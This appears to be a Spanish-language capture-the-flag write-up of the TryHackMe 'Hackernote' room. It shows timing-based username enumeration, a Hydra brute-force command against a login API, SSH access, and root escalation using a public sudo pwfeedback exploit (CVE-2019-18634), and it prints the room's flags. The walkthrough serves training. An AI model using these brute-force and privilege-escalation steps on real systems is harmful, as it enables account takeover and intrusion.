---
title: "TryHackMe: Hackernote"
date: 2024-12-08
category: "TryHackMe"
order: 5
tags: ["tryhackme", "timing-attack", "sudo", "privesc"]
layout: layouts/writeup.njk
permalink: /writeups/thm-hackernote.html
---

## Reconocimiento

```bash
sudo nmap -Pn -n -v -p- --min-parallelism 64 --min-rate 20000 --min-hostgroup 64 --randomize-hosts -sS -sV 10.10.60.13
...
Not shown: 56958 closed tcp ports (reset), 8574 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
8080/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Puertos abiertos:** 22, 80, 8080. **Lenguaje del backend:** Go (revelado por el fingerprint "Golang net/http server").

---

## Investigate

Se crea una cuenta y se intenta loguear con un usuario que no existe — el servidor responde rápido con "credenciales inválidas". Luego se intenta loguear con el usuario propio pero contraseña incorrecta, y se nota que la respuesta tarda un par de segundos más en llegar, aunque el mensaje de error es el mismo. Esta diferencia de tiempo permite **enumerar usuarios válidos** — confirmado también interceptando con Burp Suite.

---

## Exploit — Timing attack

Se escribe un script en Python usando la librería `requests` para automatizar el envío:

```python
creds = {"username": username, "password": "invalidPassword!"}
response = r.post(URL, json=creds)
```

Se mide el tiempo de respuesta con la librería estándar `time`:

```python
startTime = time.time()
doLogin(user)
endTime = time.time()
```

Se repite el proceso para toda una lista de usuarios (dos ciclos `for` anidados: uno recorre la lista de usuarios, otro mide el tiempo de cada intento). Los usuarios cuyo tiempo de respuesta cae dentro del 10% más alto son los más probables de ser válidos.

### ¿Por qué cambia el tiempo de respuesta?

El backend está escrito intencionalmente de forma insegura: el servidor solo verifica la contraseña si el username es válido.

```python
def login(username, password):
    if username in users:  # Si es un username válido
        login_status = check_password(password)  # Esto toma un tiempo notable
        if login_status:
            return new_session_token()
        else:
            return "Username or password incorrect"
    else:
        return "Username or password incorrect"
```

Corriendo el exploit con el diccionario de usuarios, el que más tarda es `james`.

**¿Cuántos usernames de la lista son válidos?** → 1
**¿Cuál es el username válido?** → `james`

---

## Attack Passwords

Como las contraseñas están hasheadas con **bcrypt** (que toma un tiempo notable para verificar), hacer fuerza bruta con una wordlist larga como rockyou no es factible. La pista del usuario permite crear un diccionario más eficiente.

### Crear la wordlist

Se combina una wordlist de colores con una de números usando Hashcat Utils Combinator:

```bash
git clone <hashcat-utils> && cd hashcat-utils-1.9/src && make
./combinator.bin colors.txt numbers.txt > wordlist.txt
```

### Atacar la API con Hydra

La API acepta tanto Form data como JSON. El frontend envía JSON como POST, así que se ataca con el módulo `http-post-form` de Hydra:

- Request Body: `{"username":"admin","password":"admin"}`
- Request Path: `/api/user/login`
- Mensaje de error para login incorrecto: `"Invalid Username Or Password"`

```bash
hydra -l james -P wordlist.txt 10.10.60.13 http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password" -vv
...
[80][http-post-form] host: 10.10.60.13   login: james   password: blue7
1 of 1 target successfully completed, 1 valid password found
```

**¿Cuántas contraseñas tenía la wordlist?** → 180
**¿Cuál era la contraseña del usuario?** → `blue7`

### Login por SSH

```bash
ssh james@10.10.60.13
...
james@hackernote:~$ ls
user.txt
james@hackernote:~$ cat user.txt
thm{56911bd7ba1371a3221478aa5c094d68}
```

---

## Escalate

Al ejecutar `sudo su`, la contraseña se muestra con asteriscos en pantalla — este comportamiento es la vulnerabilidad conocida como **pwfeedback**.

**CVE:** [CVE-2019-18634](https://nvd.nist.gov/vuln/detail/CVE-2019-18634)

### Compilar y transferir el exploit

Exploit obtenido de [saleemrashid/sudo-cve-2019-18634](https://github.com/saleemrashid/sudo-cve-2019-18634.git):

```bash
make
# cc -Os -g3 -std=c11 -Wall -Wextra -Wpedantic -static -o exploit exploit.c
```

Se transfiere vía SCP desde la máquina de la víctima hacia la propia (usando la IP de `tun0` con SSH habilitado localmente):

```bash
james@hackernote:~$ scp phctr@10.13.51.230:/home/phctr/.../exploit .
```

### Ejecutar el exploit

```bash
james@hackernote:~$ ./exploit
[sudo] password for james:
Sorry, try again.
# id
uid=0(root) gid=0(root) groups=0(root),1001(james)
```

**Root flag:**

```bash
# cat /root/root.txt
thm{af55ada6c2445446eb0606b5a2d3a4d2}
```
